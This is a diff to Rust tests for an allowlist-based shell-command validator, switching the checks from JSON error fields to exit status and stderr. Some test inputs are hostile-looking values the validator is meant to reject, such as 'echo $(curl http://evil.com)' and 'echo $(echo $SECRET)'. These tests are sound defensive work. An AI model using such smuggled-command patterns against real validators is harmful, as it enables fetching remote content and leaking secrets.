@@ -12,9 +12,8 @@ fn test_and_or_now_supported() {
         .arg("echo hello && echo world")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    let stdout = json["stdout"].as_str().unwrap();
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
+    let stdout = String::from_utf8_lossy(&output.stdout);
     assert!(stdout.contains("hello"));
     assert!(stdout.contains("world"));
 }
@@ -29,9 +28,9 @@ fn test_or_operator() {
         .arg("false || echo fallback")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    assert!(json["stdout"].as_str().unwrap().contains("fallback"));
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(stdout.contains("fallback"));
 }
 
 #[test]
@@ -41,9 +40,9 @@ fn test_backtick_substitution_validates_inner_command() {
         .arg("echo `whoami`")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("whoami") && err.contains("not in allowlist"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("whoami") && stderr.contains("not in allowlist"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -53,9 +52,9 @@ fn test_command_substitution_validates_inner_command() {
         .arg("echo $(whoami)")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("whoami") && err.contains("not in allowlist"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("whoami") && stderr.contains("not in allowlist"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -68,9 +67,9 @@ fn test_command_substitution_with_allowed_command() {
         .arg("echo $(echo inner)")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    assert_eq!(json["stdout"].as_str().unwrap().trim(), "inner");
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "inner");
 }
 
 #[test]
@@ -79,11 +78,11 @@ fn test_parse_error_eval() {
         .arg("eval echo hi")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
     // eval is rejected at the allowlist level
-    assert!(err.contains("eval"), "error was: {}", err);
-    assert!(err.contains("not in allowlist"), "error was: {}", err);
+    assert!(stderr.contains("eval"), "stderr was: {}", stderr);
+    assert!(stderr.contains("not in allowlist"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -95,9 +94,7 @@ fn test_keywords_in_quotes_allowed() {
         .arg("grep 'if' src/main.rs")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    assert_eq!(json["exit_code"], 0);
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
 }
 
 #[test]
@@ -109,8 +106,7 @@ fn test_and_in_quotes_allowed() {
         .arg("grep '&&' src/validator.rs")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
 }
 
 #[test]
@@ -123,9 +119,9 @@ fn test_if_then_fi_supported() {
         .arg("if true; then echo yes; fi")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    assert_eq!(json["stdout"].as_str().unwrap().trim(), "yes");
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert_eq!(stdout.trim(), "yes");
 }
 
 #[test]
@@ -136,9 +132,8 @@ fn test_for_loop_supported() {
         .arg("for x in a b c; do echo $x; done")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_null(), "error: {:?}", json["error"]);
-    let stdout = json["stdout"].as_str().unwrap();
+    assert!(output.status.success(), "stderr: {}", String::from_utf8_lossy(&output.stderr));
+    let stdout = String::from_utf8_lossy(&output.stdout);
     assert!(stdout.contains("a\nb\nc"));
 }
 
@@ -148,8 +143,9 @@ fn test_allowlist_rejection() {
         .arg("curl http://example.com")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].as_str().unwrap().contains("not in allowlist"));
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("not in allowlist"));
 }
 
 #[test]
@@ -158,8 +154,9 @@ fn test_empty_input() {
         .arg("")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert!(json["error"].is_string());
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(!stderr.is_empty(), "expected an error message on stderr");
 }
 
 #[test]
@@ -168,9 +165,9 @@ fn test_function_definition_rejected() {
         .arg("foo() { echo hi; }")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("function"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("function"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -181,9 +178,9 @@ fn test_background_execution_rejected() {
         .arg("sleep 1 &")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("background"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("background"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -193,9 +190,9 @@ fn test_unapproved_var_in_substitution_rejected() {
         .arg("echo $(echo $SECRET)")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("SECRET") && err.contains("not in approved list"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("SECRET") && stderr.contains("not in approved list"), "stderr was: {}", stderr);
 }
 
 #[test]
@@ -205,7 +202,7 @@ fn test_nested_disallowed_command_in_substitution() {
         .arg("echo $(curl http://evil.com)")
         .output()
         .unwrap();
-    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let err = json["error"].as_str().unwrap();
-    assert!(err.contains("curl") && err.contains("not in allowlist"), "error was: {}", err);
+    assert!(!output.status.success());
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(stderr.contains("curl") && stderr.contains("not in allowlist"), "stderr was: {}", stderr);
 }
